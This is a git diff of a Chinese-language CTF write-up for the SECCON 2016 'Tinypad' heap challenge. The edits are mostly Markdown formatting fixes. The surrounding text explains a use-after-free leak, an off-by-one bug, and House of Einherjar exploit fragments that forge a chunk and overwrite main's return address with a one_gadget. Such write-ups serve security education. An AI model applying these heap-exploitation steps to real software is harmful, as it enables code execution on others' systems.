@@ -1,8 +1,9 @@
-##Tinypad Seccon CTF 2016(House Of Einherjar)
-###序言
+## Tinypad Seccon CTF 2016(House Of Einherjar)
+
+### 序言
 > 随着对`how2heap`的学习, 难度也是越来越大, 改革进入了深水区.
 
-###程序运行
+### 程序运行
 **1.菜单**
 ```
 | [A] Add memo                                                                 |
@@ -57,17 +58,19 @@ Stack:    Canary found
 NX:       NX enabled
 PIE:      No PIE (0x400000)
 ```
-**结论:** `Full RELRO`代表我们不能复写`got`表.`NX`代表我们不能使用`shellcode`, `Canary found`代表我们不能使用栈溢出.说实话, 现在的`CTF`全国性质大赛使用栈溢出的题已经比较少了, 大部分都是`PWN`技能的高级应用.
+&nbsp;&nbsp;&nbsp;&nbsp;**结论:** `Full RELRO`代表我们不能复写`got`表.`NX`代表我们不能使用`shellcode`, `Canary found`代表我们不能使用栈溢出.说实话, 现在的`CTF`全国性质大赛使用栈溢出的题已经比较少了, 大部分都是`PWN`技能的高级应用.
 
 **2. 内存泄露**
 > &nbsp;&nbsp;&nbsp;&nbsp;通过观察发现, 程序定了一个`tinypad`的数组, 数组存放在`0x6020140`.`Delete memo`时程序只是将`size`置为`0`,将`s`对应的堆地址释放, 并没有将`s`本身置为`NULL`, 而程序就是通过判断`s`是否为空来进行显示对应的数组内容, 于是存在内存泄露.
 
 ![result01](./01.png)
+
 **３.缓冲区**
 ![result02](./02.png)
 > &nbsp;&nbsp;&nbsp;&nbsp;通过上图分析, 程序会将`0x602040`作为一个编辑的缓冲去, 输入`Y`之后才会将输入内容复制到`s`对应的堆块中去.
 
 **4.一个假设**
+
 &nbsp;&nbsp;&nbsp;&nbsp;假如我们能够分配一个地址在`0x602040`附近, 那么我们就能通过分配足够的内存, 编辑`tinypad`数组的内容, 修改`s`指向的堆块, 实现任意地址读写.
 
 ### 知识点讲解
@@ -125,10 +128,12 @@ p.recvall()
 p.close()
 ```
 **前**
+
 ![result03](03.png)
 
 ----
 **后**
+
 ![result04](04.png)
 ```
 unsorted bin @ 0x7fb86398eb88
@@ -137,10 +142,15 @@ unsorted bin @ 0x7fb86398eb88
 &nbsp;&nbsp;&nbsp;&nbsp;**结论:** 通过修改对应的`size`, 我们几乎可以实现任意地址读写. 这个利用脚本将`unsorted bin`中的`fd`, `bk`指向我们`fake chunk`所在地址.
 
 ### 漏洞分析
+
 **1.Off By One**
+
 ![result05](./05.png)
+
 **2. 逻辑漏洞**
+
 ![](./06.png)
+
 **结论:**　可以显示释放后的地址的内容, 泄露堆地址.
 
 ### 过程
@@ -155,6 +165,7 @@ delete(3)
 delete(1)
 ```
 ![](./07.png)
+
 **2.House Of Einherjar**
 ```
 add(0x18, "A"*0x18)
@@ -178,7 +189,9 @@ delete(2)
 edit(4, "D"*0x20 + p64(0) + p64(0x101) + p64(main_arena + 0x58)*2) #修复unsorted bin
 ```
 ![](./08.png)
+
 **3.攻击**
+
 > 将`main`函数的返回值地址修改为`one_gadget`地址
 > 由于程序是现将`size`和`s`先存放入数组, 后读取内容,　我们可以控制`index`1指向的地址.
 
